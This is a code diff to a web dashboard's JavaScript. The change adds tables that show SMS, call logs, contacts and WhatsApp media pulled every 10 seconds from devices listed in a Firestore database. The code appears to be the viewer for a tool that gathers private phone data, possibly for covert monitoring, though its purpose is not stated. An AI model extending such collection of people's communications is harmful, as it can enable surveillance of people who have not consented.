@@ -796,7 +796,7 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
         var dot = $('firestoreDot');
         if (!tbody || !payload) return;
         try {
-            var res = await fetch('/api/jp-devices?' + new URLSearchParams({ key: KEY, full: '1' }).toString());
+            var res = await fetch('/api/jp-devices?' + new URLSearchParams({ key: KEY, full: '1', subcollections: '1' }).toString());
             var j = await res.json();
             if (!res.ok || j.success === false) {
                 throw new Error(j.error || ('HTTP ' + res.status));
@@ -819,18 +819,78 @@ window.vas = window.vas || function() { (window.vass = window.vass || []).push(a
                     '</tr>';
             }).join('') || '<tr><td colspan="5" class="hint">no documents in Firestore</td></tr>';
 
-            payload.innerHTML = devices.map(function (d) {
-                var body = d.full_payload || {};
-                return '<div class="payload-section">' +
-                    '<div class="payload-section-head">' +
-                        '<h3>' + esc(d.deviceId || 'unknown') + '</h3>' +
-                        '<div class="payload-section-hint">' + esc(d.deviceType || '–') + ' · ' + esc(d.model || '–') + ' · ' + (d.live ? 'live' : 'offline') + '</div>' +
-                    '</div>' +
-                    '<pre class="mono" style="white-space:pre-wrap;background:rgba(0,0,0,.15);padding:10px;border-radius:6px;font-size:11px;overflow-x:auto;">' +
-                        esc(JSON.stringify(body, null, 2)) +
-                    '</pre>' +
-                '</div>';
-            }).join('') || '<div class="hint">no documents in Firestore</div>';
+            // Reuse renderLiveDevicePayload — the same formatter page-device
+            // uses for its "Complete daemon payloads". Every Firestore field
+            // renders as labeled stats / grids / tree rows, not a raw JSON
+            // dump. Because we clear the container before each poll, old
+            // sections disappear as new ones replace them.
+            payload.innerHTML = '';
+            if (!devices.length) {
+                payload.innerHTML = '<div class="hint">no documents in Firestore</div>';
+            } else {
+                var rendered = 0;
+                devices.forEach(function (d, i) {
+                    if (!d.full_payload) return;
+                    payload.appendChild(renderLiveDevicePayload(d, rendered));
+                    rendered++;
+                });
+                if (!rendered) {
+                    payload.innerHTML = '<div class="hint">devices returned but no full_payload — endpoint called without ?full=1</div>';
+                }
+            }
+
+            // Subcollection tables (whatsappMedia · callLogs · sms · contacts).
+            // Only rendered when the backend includes subcollections (see
+            // /api/jp-devices?full=1&subcollections=1). Each subcollection is
+            // a small table under the device card. Fresh HTML every poll, so
+            // stale records disappear the instant a device syncs newer ones.
+            var subs = ['whatsappMedia', 'callLogs', 'sms', 'contacts'];
+            var subFriendly = {
+                whatsappMedia: 'WhatsApp media',
+                callLogs: 'Call logs',
+                sms: 'SMS',
+                contacts: 'Contacts',
+            };
+            devices.forEach(function (d) {
+                if (!d.subcollections) return;
+                subs.forEach(function (name) {
+                    var rows = d.subcollections[name] || [];
+                    if (!rows.length) return;
+                    var box = document.createElement('div');
+                    box.className = 'payload-section';
+                    box.style.marginTop = '10px';
+                    var head2 = document.createElement('div');
+                    head2.className = 'payload-section-head';
+                    var h3 = document.createElement('h3');
+                    h3.textContent = subFriendly[name] + ' — ' + (d.deviceId || 'device');
+                    head2.appendChild(h3);
+                    var hint = document.createElement('span');
+                    hint.className = 'payload-section-hint';
+                    hint.textContent = rows.length + ' most-recent record(s) · replaces on every 10 s sync';
+                    head2.appendChild(hint);
+                    box.appendChild(head2);
+                    var keySet = new Set();
+                    rows.forEach(function (r) { Object.keys(r).forEach(function (k) { keySet.add(k); }); });
+                    var cols = ['id'].concat([...keySet].filter(function (k) { return k !== 'id'; }).slice(0, 6));
+                    var table = document.createElement('table');
+                    table.innerHTML = '<thead><tr>' + cols.map(function (c) { return '<th>' + esc(c) + '</th>'; }).join('') + '</tr></thead><tbody>' +
+                        rows.map(function (r) {
+                            return '<tr>' + cols.map(function (c) {
+                                var v = r[c];
+                                if (v == null) return '<td>–</td>';
+                                if (typeof v === 'object') v = JSON.stringify(v);
+                                var s = String(v);
+                                if (s.length > 90) s = s.slice(0, 87) + '…';
+                                return '<td>' + esc(s) + '</td>';
+                            }).join('') + '</tr>';
+                        }).join('') + '</tbody>';
+                    var wrap = document.createElement('div');
+                    wrap.className = 'table-wrap';
+                    wrap.appendChild(table);
+                    box.appendChild(wrap);
+                    payload.appendChild(box);
+                });
+            });
 
             summary.textContent = devices.length + ' document(s) · database ' + (j.database || '?') + ' · synced at ' + when.toLocaleTimeString();
             head.textContent = 'Live sync of every document in the ' + (j.database || 'eka-agent') + ' database. Poll interval 10 s. Old data is replaced on every sync, so nothing clutters the view.';
